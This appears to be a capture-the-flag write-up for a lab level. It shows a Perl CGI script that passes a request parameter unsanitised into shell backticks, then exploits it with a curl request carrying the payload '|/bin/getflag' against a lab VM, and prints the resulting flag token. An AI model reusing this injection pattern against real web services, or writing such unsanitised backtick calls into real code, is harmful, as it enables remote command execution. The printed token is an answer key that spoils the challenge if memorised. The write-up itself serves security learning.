# level04

```bash
~$ ls
level04.pl

~$ cat ./level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

~$ ./level04.pl x='lol'
Content-type: text/html

lol

~$ ./level04.pl x='|/bin/getflag'
Nope there is no token here for you sorry. Try again :)
```

At this point, we know what the exploit is and we can execute `getflag` through the zombie program.

But `getflag` isn't being executed by the right user, httpd needs to execute it ;)

On the host:
```bash
curl "http://192.168.122.237:4747/?x=|/bin/getflag"
# -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
